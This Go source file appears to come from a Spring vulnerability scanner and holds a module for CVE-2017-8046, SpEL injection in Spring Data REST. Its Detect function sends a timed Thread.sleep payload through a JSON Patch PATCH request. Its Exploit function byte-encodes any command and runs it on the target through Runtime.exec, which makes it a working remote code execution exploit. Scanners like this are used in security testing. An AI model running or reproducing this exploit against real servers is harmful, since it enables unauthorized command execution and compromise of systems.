package vulns

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2017-8046 Spring Data REST 的 JSON Patch path 参数 SpEL 注入。
// path 中任意段会被作为 SpEL 求值，命令经 byte 数组形态执行（避免引号转义）。
// 检测用计时法：path 中求值 Thread.sleep，漏洞版本响应阻塞。
type cve20178046 struct{}

func init() { Register(&cve20178046{}) }

var (
	sdrSleepMs  = 3000
	sdrThresh   = 2000 * time.Millisecond
	sdrAttempts = 4
)

func (c *cve20178046) Info() model.Info {
	return model.Info{
		ID:         "CVE-2017-8046",
		Name:       "Spring Data REST PATCH 路径 SpEL RCE",
		Type:       "RCE",
		Severity:   "critical",
		Affected:   "Spring Data REST 2.5.10-2.5.11 / 2.6.0-2.6.6 / 3.0.0-3.0.7 及更早（2.6.9/3.0.8+ 修复）",
		Reference:  "https://tanzu.vmware.com/security/cve-2017-8046",
		HasExploit: true,
		ArgHint:    "要执行的命令（byte 数组形态执行，无回显）",
	}
}

// patchSpEL 发送 PATCH 请求，path 首段为 SpEL。
func (c *cve20178046) patchSpEL(ctx context.Context, t model.Target, spel string) (int, []byte, error) {
	body := fmt.Sprintf(`[{ "op": "replace", "path": "%s/lastname", "value": "vulhub" }]`, spel)
	u := t.URL + "customers/1"
	resp, rb, err := client.Do(ctx, t.Client, http.MethodPatch, u, map[string]string{
		"Content-Type": "application/json-patch+json",
	}, body)
	if err != nil {
		return 0, nil, err
	}
	return resp.StatusCode, rb, nil
}

func (c *cve20178046) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	var lastErr error
	for i := 0; i < sdrAttempts; i++ {
		start := time.Now()
		code, _, err := c.patchSpEL(ctx, t,
			fmt.Sprintf("T(java.lang.Thread).sleep(%d)", sdrSleepMs))
		if err != nil {
			lastErr = err
			time.Sleep(500 * time.Millisecond)
			continue
		}
		elapsed := time.Since(start)
		if os.Getenv("SSP_DEBUG") != "" {
			fmt.Fprintf(os.Stderr, "[dbg-8046] attempt %d: elapsed=%v code=%d\n", i, elapsed, code)
		}
		if elapsed >= sdrThresh {
			v.Vulnerable = true
			v.Evidence = fmt.Sprintf("patch path 中的 sleep(%d) 使响应阻塞 %v", sdrSleepMs, elapsed)
			v.Detail = "path 参数 SpEL 确已求值；命令经 byte 数组形态执行，无回显"
			break
		}
		_ = code // 已修复版本：SpEL 不求值，path 非法快速返回
		if code == http.StatusNotFound {
			// 资源 /customers/1 不存在，环境不适用
			v.Detail = "资源 /customers/1 不存在，非 Spring Data REST 演示数据环境"
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	if !v.Vulnerable && lastErr != nil {
		v.Err = lastErr.Error()
	}
	return v, nil
}

// Exploit 的 arg 为要执行的命令，编码为 byte 数组形态执行（无回显）。
func (c *cve20178046) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	bytes := make([]string, 0, len(arg))
	for _, b := range []byte(arg) {
		bytes = append(bytes, fmt.Sprintf("%d", b))
	}
	spel := fmt.Sprintf("T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{%s}))",
		strings.Join(bytes, ","))
	code, _, err := c.patchSpEL(ctx, t, spel)
	if err != nil {
		return "", "", err
	}
	note := "无回显漏洞：命令已随 path SpEL 执行，请经 OOB 平台或落盘文件验证"
	if code != http.StatusOK && code != http.StatusNoContent && code != http.StatusConflict {
		note += fmt.Sprintf("（目标返回 %d）", code)
	}
	return "", note, nil
}
